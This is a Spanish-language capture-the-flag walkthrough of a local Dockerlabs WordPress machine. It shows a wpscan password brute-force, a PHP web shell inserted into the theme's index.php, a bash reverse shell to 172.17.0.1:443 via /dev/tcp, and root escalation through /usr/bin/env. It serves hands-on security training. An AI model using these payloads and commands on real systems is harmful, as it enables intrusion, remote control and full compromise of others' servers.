Desplegamos la máquina vulnerable poniendo en la terminal la línea de comandos **bash auto_deploy.sh walkingcms.tar** en la carpeta donde se encuentre el contenido extraído del zip.<br>
<ins>La dirección IP de la máquina a vulnerar siempre es la 172.17.0.2</ins>.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/87016dbc-b099-4e2a-91f1-eb2ea00839f9)

Ahora, realizamos un escaneo de puertos de la máquina para revisar los puertos abiertos existentes y los posibles servicios a atacar mediante el uso de esos puertos.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/2b40400c-b8a9-42af-b6fd-40076e7f34db)

Podemos ver que se encuentra abierto el puerto ***80***, correspondiente al servicio ***HTTP***.

Vamos a intentar atacar mediante HTTP. Nos dirigimos al navegador y en el buscador ponemos http://172.17.0.2:80.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/87a25bee-f4ae-4562-bed1-f63a6f416fdf)

Vamos a obtener los subdirectorios existentes en la página web para conseguir visualizar otras páginas que puedan darnos más información.
Debido a que revisando el código fuente de la página y mediante el uso del comando ***ffuf*** para realizar fuzzing no detectamos nuevas páginas, vamos a emplear un comando similar llamado ***gobuster***, con el que obtendremos las páginas existentes en distintos formatos. En este caso, vamos a buscar aquellas que tengan extensión .*html*, .*php*, .*sh* y .*py*.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/d00434fd-ebca-4a97-9170-b7fda47694b5)

Hemos encontrado un subdirectorio web llamado "wordpress". Podemos visualizar su contenido en busca de algun detalle o alguna pista para lograr vulnerar mediante el HTTP a la máquina que queremos atacar.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/b17aa335-a198-4a34-8f16-89998adbd10e)

Al acceder a la dirección http://172.17.0.2/wordpress nos sale esta página de inicio. Miramos aquello en lo que podamos rebuscar, por ejemplo, probamos a ver que ocurre si hacemos clic donde pone "¡Hola, mundo!" o en "Página de ejemplo".

Al pulsar en el texto "¡Hola, mundo!":

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/2218fc2a-9f6a-47fc-8103-cfb89710770a)

Vemos que el usuario que ha escrito esta entrada es el usuario **mario**.

Al pulsar en el texto "Página de ejemplo":

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/31364630-32ea-45a1-96df-e1f68ca3995d)

Parece que hay otro enlace insertado en el texto ("tu escritorio"), comprobamos hacia donde nos redirige:

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/bbd12af0-4d40-49bb-8c0a-009c29c014d3)

El enlace nos ha llevado al formulario de inicio de sesión de WordPress, por lo que hay que obtener la contraseña del usuario mario para acceder a su panel de WordPress.

Para realizar un ataque de fuerza bruta en WordPress existe un comando en Kali Linux llamado ***wpscan***, que se encarga de escanear las vulnerabilidades de un sitio web creado con WordPress. La línea de código que utilizaremos en la terminal para el ataque de fuerza bruta es **wpscan --url 172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt**

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/b4db0c25-c05b-419d-9084-9cadf1305bea)

Podemos ver que la ejecución del comando nos devuelve unas claves válidas para el formulario de Login de WordPress:

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/938f03ec-de16-4922-a0e9-eef32d2202ce)

La contraseña del usuario "mario" es "love". Probamos las credenciales en el formulario.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/f1c534ca-960a-434f-a7fd-d0d39bbab1cf)

Estamos dentro del panel de administración del sitio web. Hay que buscar ahora la manera de acceder a la máquina desde el sitio web.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/73c0ddf8-9174-4402-8485-74e126c3f5c9)

Podemos intentar realizar una reverse shell desde WordPress mediante un plugin que nos permita la edición de plantillas. Para ello nos vamos a **Apariencia>Theme Code Editor**.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/0514ddfc-87b5-4396-acc8-817eb715b792)

Dentro de esta ventana, en **Theme Files** seleccionamos *index.php*:

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/08d65946-12fe-4dab-a136-93a0162f7664)

Editamos el código existente e insertamos lo siguiente: **&lt;?php echo "&lt;pre&gt;". shell_exec($_REQUEST['cmd']). "&lt;/pre&gt;" ?&gt;**


  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/f49759eb-c2d0-4c73-ada0-32f7ead3abc3)

Ahora si nos dirigimos a visualizar el archivo index.php en el navegador escribimos la dirección http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php y seguido del index.php escribimos la cadena de texto "**?cmd=**" para poder ejecutar cualquier comando de consola y ver la salida de este en la página. Esto es lo que se nos muestra al ejecutar el comando whoami:

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/a0233513-5a48-495c-bc74-713bcd3c007d)

Somos el usuario www-data. Sabiendo que podemos ejecutar cualquier comando, vamos a realizar una reverse shell utilizando la página web [https://www.revshells.com/](https://www.revshells.com/).

Nos ponemos en escucha por el puerto 443:

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/ebe01817-867c-4993-824e-282b4d583439)

Una vez tenemos la reverse shell (en mi caso, *bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'*) tendremos que descodificarlo para transformarlo en un formato válido para la dirección URL. Para ello usamos el Decoder disponible en Burp Suite y copiamos la cadena generada para ejecutar la reverse shell.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/f2c93360-b174-4cc2-bed3-196178cf2212)

Y una vez ejecutamos esto, la página se queda cargando, por lo que al mirar en nuestra terminal abierta vemos que la reverse shell ha funcionado correctamente:

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/265a7822-57f1-45f5-b206-7ee3d04a4d9d)

Vamos a realizar una escalada de privilegios para acceder como el usuario root:

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/1cf48d6a-e447-4491-956d-fd88574a47e1)

Vemos que el usuario www-data puede ejecutar estos archivos binarios. En este caso, nos interesa realizar la escalada de privilegios mediante el binario ***/usr/bin/env***.
Escribimos el comando **/usr/bin/env /bin/bash -p** para lograr el acceso como el usuario root.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/9a4ec453-e1ca-44c3-8a1e-34271cb13a19)

Hemos logrado acceder como el usuario root, por lo que ahora podemos realizar cualquier acción en el sistema.

Una vez finalizamos con la máquina de Dockerlabs presionamos **Ctrl+C** para eliminarla.

  ![image](https://github.com/PedroMontoya11/Laboratorios-CTF/assets/145665312/796f2ec8-acc0-4b0d-bb06-abfe42262359)
